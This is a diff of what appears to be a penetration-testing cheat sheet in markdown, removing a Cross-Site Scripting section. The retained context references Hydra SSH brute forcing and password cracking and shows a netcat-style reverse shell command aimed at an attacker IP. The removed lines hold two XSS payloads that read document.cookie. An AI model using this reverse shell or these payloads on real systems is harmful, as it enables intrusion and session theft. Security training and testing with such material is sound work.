@@ -15,7 +15,6 @@
 - [Hydra](#hydra) - Brute force attack on ssh
 - [FTP](#ftp) 
 - [Cewl](#cewl) - It is use to create a worldlist using website link
-- [Cross-Site Scripting](#xxs)
 - [Brute-force attack](#bruteforce)
 - [Password Cracking](#cracking)
 - [Simple Local Web Servers](#localweb)
@@ -114,21 +113,6 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
-
-
-
-
-
-
-
-- ## Cross-Site Scripting <a name="xxs"></a>
-```js
-<script>alert(document.cookie)</script>
-```
-
-```js
-<img src="" onerror=alert(document.cookie)>
-```
 
 
 
